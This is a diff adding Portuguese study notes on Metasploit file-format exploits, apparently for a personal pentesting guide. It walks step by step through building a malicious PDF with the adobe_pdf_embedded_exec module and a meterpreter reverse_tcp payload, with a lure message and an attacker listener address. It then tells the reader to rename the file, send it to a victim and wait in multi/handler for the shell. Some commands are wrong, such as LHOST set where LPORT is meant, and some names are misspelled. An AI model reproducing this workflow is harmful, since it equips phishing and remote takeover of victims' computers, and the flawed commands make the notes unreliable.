@@ -72,3 +72,56 @@ exploit
 #####A vitima ira executar o programa normalmente
 !!!! Se a vitima estiver utilizando antivirus, provavelmente o arquivo sera identificado como malicioso.
 
+====================================================================
+
+Vulnerabilidades File Format
+-Formatos de arquivos com softwares vulneraveis, podem ser manipulados com injeção de payloads
+
+Verificar no msfconsole:
+search exploit/windows/fileformat
+grep -i word search exploit/windows/fileformat
+grep -i winrar search exploit/windows/fileformat
+grep -i pdf search exploit/windows/fileformat
+
+Pode-se pesquisar as vulnerabilidades de programas, porem no exploit informa exatamente a versão do programa vulneravel. 
+-Em versões não descritas no exploit, o payload nao funcionara.
+
+Para verificar a utilização do payload:
+info exploit/windows/fileformat/pdfreader
+
+####OBS: Esse exploit, a pessoa ira abrir um arquivo pdf, porem uma menssagem sera exibida antes
+Usar o exploit:
+use exploit/windows/fileformat/adobe_pdf_enbedded_exec
+
+Setar o payload:
+set payload windows/meterpreter/reverse_tcp
+
+Setar o arquivo PDF que iremos infectar:
+set INFILENAME /root/arquivo.pdf
+
+Setar a informação pré abertura do arquivo
+set LAUNCH_MESSAGE Abra o arquivo para visualizar
+
+Setar servidor atacante
+set LHOST 192.168.1.2
+
+setar porta:
+set LHOST 4444
+
+Para gerar o arquivo, dar o exploit:
+exploit
+
+O comando exploit ira gerar o arquivo PDF malicioso com o nome "evil.pdp"
+Renomeie o arquivo e envie para a vitima
+### Lembrando que o payload só funcionara caso a vitima esteja com o software adobe vulneravel
+
+Para aguardar a conexão da vitima:
+use multhandler
+
+Setar o payload meterpreter
+set payload windows/meterpreter/reverse_tcp
+
+setar as informações de LHOST e LPORT conforme configurado no payload.
+
+
+
